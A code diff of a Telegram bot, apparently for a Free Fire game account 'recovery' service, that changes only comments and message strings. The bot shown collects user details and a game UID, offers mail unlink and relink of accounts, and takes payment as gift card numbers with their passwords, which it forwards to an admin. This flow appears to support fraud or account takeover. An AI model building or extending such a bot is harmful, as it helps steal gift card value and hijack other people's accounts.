@@ -12,7 +12,7 @@ bot = telebot.TeleBot(TOKEN, threaded=False)
 app = Flask(__name__)
 
 user_states = {}
-SESSION_TIMEOUT = 900  # 15 minutes
+SESSION_TIMEOUT = 900  # 15 minutes session timeout
 
 def generate_ticket_id():
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
@@ -44,7 +44,7 @@ def webhook():
 
 @app.route('/')
 def index():
-    return "FF Recovery Bot is live and running 24/7!"
+    return "FF Recovery Chat Bot is live and running 24/7!"
 
 # 1. /start command -> Welcome Banner + T&C + Agree Button
 @bot.message_handler(commands=['start'])
@@ -66,13 +66,12 @@ def start_command(message):
     except Exception:
         bot.send_message(chat_id, caption, parse_mode="Markdown", reply_markup=markup)
 
-# 2. T&C Agree -> Delete Banner Photo & Send Fresh Text Message for Service Selection
+# 2. T&C Agree -> Delete Banner & Show Service Selection
 @bot.callback_query_handler(func=lambda call: call.data == "agree_tc")
 def agree_tc_callback(call):
     safe_answer(call.id)
     chat_id = call.message.chat.id
     
-    # Delete the old photo banner message cleanly
     try:
         bot.delete_message(chat_id, call.message.message_id)
     except Exception:
@@ -114,7 +113,7 @@ def plan_selection_callback(call):
         reply_markup=markup
     )
 
-# 4. Sub-Options & Pricing Display
+# 4. Sub-Options & Pricing Display (Mail Unlink vs Unlink + Relink)
 @bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_plan_"))
 def show_sub_options(call):
     safe_answer(call.id)
@@ -140,7 +139,7 @@ def show_sub_options(call):
         reply_markup=markup
     )
 
-# 5. Handle Sub-Option selection
+# 5. Handle Sub-Option Selection & Start Chat Form Flow
 @bot.callback_query_handler(func=lambda call: call.data.startswith("sub_"))
 def handle_sub_selection(call):
     safe_answer(call.id)
@@ -166,7 +165,7 @@ def handle_sub_selection(call):
         parse_mode="Markdown"
     )
 
-# 6. Step-by-Step Chat Data Collection
+# 6. Step-by-Step Chat Form Data Collection
 @bot.message_handler(func=lambda message: message.chat.id in user_states and "step" in user_states[message.chat.id])
 def collect_user_details(message):
     chat_id = message.chat.id
@@ -250,7 +249,7 @@ def handle_uid(message):
     
     bot.send_message(chat_id, summary_text, parse_mode="Markdown", reply_markup=markup)
 
-# 7. Payment Screen
+# 7. Payment Screen & Gift Card Collection
 @bot.callback_query_handler(func=lambda call: call.data == "proceed_payment")
 def proceed_to_payment(call):
     safe_answer(call.id)
@@ -272,6 +271,7 @@ def handle_gift_card(message):
     chat_id = message.chat.id
     gift_card_input = message.text.strip()
     
+    # Anti-Fraud Format Validation
     if ":" not in gift_card_input or len(gift_card_input) < 10:
         bot.send_message(chat_id, "❌ **Invalid Format!** Kripya sahi format mein enter karein:\n`GiftCardNumber:Password`", parse_mode="Markdown")
         return
@@ -293,6 +293,7 @@ def handle_gift_card(message):
     
     bot.send_message(chat_id, "⏳ **Details is under verification please wait till confirmation.**", parse_mode="Markdown")
     
+    # Admin Split Notifications (2 Messages)
     msg_basic_details = (
         f"🚨 **New Recovery Request (Basic Info)**\n\n"
         f"🎟️ **Ticket:** `{ticket_id}`\n"
